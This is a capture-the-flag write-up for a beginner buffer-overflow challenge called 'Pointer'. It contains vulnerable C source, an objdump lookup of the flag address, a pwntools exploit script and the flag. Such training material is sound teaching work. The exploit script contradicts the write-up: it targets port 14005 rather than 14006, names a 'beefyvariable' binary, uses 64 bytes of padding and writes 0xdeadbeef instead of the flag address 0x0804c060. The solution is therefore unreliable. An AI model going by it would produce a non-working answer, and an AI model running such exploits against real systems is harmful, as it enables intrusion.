# Pointer

Difficulty Level: Easy
 
Got one of these pointers that point. Point it in the right direction
 
Connect via `nc challenge.ctf-fun.xyz 14006`

PS: Challenges in this category require a linux environment read [here](https://docs.google.com/document/d/13RjL_RWibA9xYOKvSCXpTGG0D2ZYa3kDzprGNa8ypeA/edit?usp=sharing) for a guide to installing a linux VM

### Hints
- Use `objdump -t ./pointer` to show the memory location of the function
you can filter the results by piping it to `grep`
- change target to point to flag


## Deployment

```bash
cd service
sudo ./pointer.sh &
```

## Solution
Looking at the source code, we see that target can be overwritten from buffer.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char flag[64];
char *password = "Int3rest1ng";
char *success = "Password accepted. Welcome.";
char *failure = "Intruder detected! Get him!";

int main(int argc, char** argv) {
	char* target;
	char buffer[32] = {0x00};
	FILE *f;

	setvbuf(stdin,NULL,2,0);
	setvbuf(stdout,NULL,2,0);
	setvbuf(stderr,NULL,2,0);

	// Set up flag
	f = fopen("flag.txt","r");
	if (f == NULL) {
		printf("Flag File is Missing.\n");
		exit(0);
	}
	fgets(flag,sizeof(flag),f);

	printf("[HELPER] target is located at %p and buffer is located at %p\n\n", &target, &buffer);

	target = failure;
	printf("Welcome to my secret base. What's the password?\n");
	fgets(buffer, 0x30, stdin);

	if (strcmp(buffer, password) == 0) {
		target = success;
	}

	printf("%s\n", target);
}
```
At the end of the code we see that target is being printed. Thus in order to print the flag we will overwrite target to the location of flag.
```c
printf("%s\n", target);
```

Use `objdump -t ./pointer` or `info variables` in `gdb` to find out where flag is located then overwrite target to flag (0x0804c060)

```bash
$ objdump -t pointer | grep flag
0804c060 g     O .bss	00000040              flag
```

```python
from pwn import *
def main():
    #io = process("./beefyvariable")
    io = remote("challenge.ctf-fun.xyz", 14005)
    payload = b"A" * 64 + p32(0xdeadbeef)
    io.sendline(payload)
    io.interactive()
if __name__ == '__main__':
    main()
```

### Flag
19C4{Th3_fl4g_w4s_1h3_P@ssw0rd}